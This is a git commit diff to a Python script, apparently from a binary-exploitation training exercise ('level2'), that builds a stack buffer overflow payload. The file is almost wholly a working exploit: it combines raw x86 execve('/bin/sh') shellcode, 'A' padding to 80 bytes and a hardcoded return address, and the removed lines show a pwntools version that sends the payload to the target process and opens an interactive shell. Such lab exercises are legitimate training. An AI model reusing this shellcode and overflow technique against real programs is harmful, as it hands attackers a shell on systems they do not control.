99465caa6c5a1958af30579ad6a568bf8ba6014c
nda-cunh <hydraldev@gmail.com>
2026-02-09 18:06:37 +0100

    Update python level2 shell

--- level2/Ressources/main.py
+++ level2/Ressources/main.py
@@ -2,32 +2,12 @@ import pwn
 
 
 shellcode = pwn.asm(pwn.shellcraft.sh())
+shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
 s_len = len(shellcode)
 
 # adress 0x0804a008 
 adress = b"\x08\xa0\x04\x08"
 
-
 payload = shellcode + b'A'* (80 - s_len) + adress
 
 print(payload)
-
-# from pwn import *
-#
-# p = process('./level2')
-#
-# shellcode = asm(shellcraft.sh())
-# s_len = len(shellcode)
-#
-# # address = '0x0804a008'
-# address = b"\x08\xa0\x04\x08"
-#
-# payload = shellcode + b'A' * (80 - s_len) + address
-#
-# print("FAIRYTAIL:")
-# print(payload)
-# print("MAEL")
-#
-# p.sendline(payload)
-#
-# p.interactive()
